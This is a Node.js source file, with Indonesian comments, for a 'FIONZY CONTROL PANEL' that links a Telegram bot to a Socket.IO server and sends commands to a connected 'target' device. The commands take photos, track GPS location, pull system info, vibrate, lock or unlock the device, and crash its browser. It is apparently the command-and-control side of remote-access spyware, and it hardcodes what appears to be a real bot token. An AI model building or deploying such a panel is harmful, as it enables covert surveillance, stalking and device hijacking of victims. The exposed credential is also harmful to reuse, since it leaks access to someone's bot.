
const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// === ⚡ KONFIGURASI BOT (GANTI TOKEN TUAN!) ⚡ ===
const bot = new Telegraf('8441186762:AAG-wyDQFlP6sGXdIe6nxdk1HuEuAAyszWA');

// UI Menu Utama dengan Tombol (Keyboard Inline)
const mainMenu = (ctx) => {
    ctx.replyWithMarkdownV2(
        `⚡ *FIONZY CONTROL PANEL v6\.0* ⚡\n` +
        `──────────────\n` +
        `📱 *Status:* ONLINE\n` +
        `🛡️ *Protocol:* SECURE\n` +
        `──────────────\n` +
        `*Silahkan pilih perintah kendali:*`,
        Markup.inlineKeyboard([
            [
                Markup.button.callback('📸 Take Photo', 'snap'),
                Markup.button.callback('📍 Track GPS', 'gps')
            ],
            [
                Markup.button.callback('🔋 System Info', 'info'),
                Markup.button.callback('📳 Vibrate', 'vibrate')
            ],
            [
                Markup.button.callback('💬 Send Toast', 'ask_toast'),
                Markup.button.callback('🔴 Lock Device', 'lock')
            ],
            [
                Markup.button.callback('🟢 Unlock', 'unlock'),
                Markup.button.callback('💀 Crash Browser', 'crash')
            ],
            [Markup.button.callback('🔄 Refresh Connection', 'menu')]
        ])
    );
};

// Logika Koneksi Socket
io.on('connection', (socket) => {
    console.log('⚡ Target Terkoneksi ke Server!');
});

// Perintah /start atau /menu
bot.start((ctx) => mainMenu(ctx));
bot.command('menu', (ctx) => mainMenu(ctx));

// Handler Klik Tombol
bot.action('snap', (ctx) => { io.emit('command', '/snap'); ctx.answerCbQuery('📸 Meminta Foto...'); });
bot.action('gps', (ctx) => { io.emit('command', '/gps'); ctx.answerCbQuery('📍 Melacak Lokasi...'); });
bot.action('info', (ctx) => { io.emit('command', '/info'); ctx.answerCbQuery('🔋 Mengambil Info...'); });
bot.action('vibrate', (ctx) => { io.emit('command', '/vibrate'); ctx.answerCbQuery('📳 HP Target Bergetar!'); });
bot.action('lock', (ctx) => { io.emit('command', '/lock'); ctx.answerCbQuery('🔒 Device Locked!'); });
bot.action('unlock', (ctx) => { io.emit('command', '/unlock'); ctx.answerCbQuery('🔓 Device Unlocked!'); });
bot.action('crash', (ctx) => { io.emit('command', '/crash'); ctx.answerCbQuery('💀 Browser Crashed!'); });
bot.action('menu', (ctx) => mainMenu(ctx));

// Fitur Toast via Ketik manual
bot.on('text', (ctx) => {
    const msg = ctx.message.text;
    if (msg.startsWith('/toast ')) {
        io.emit('command', msg);
        ctx.reply(`✅ Toast Terkirim: ${msg.split('/toast ')[1]}`);
    } else if (msg === '/menu') {
        mainMenu(ctx);
    }
});

server.listen(3000, '0.0.0.0', () => {
    console.log('⚡ Fionzy-Server Aktif di Port 3000');
});

bot.launch();
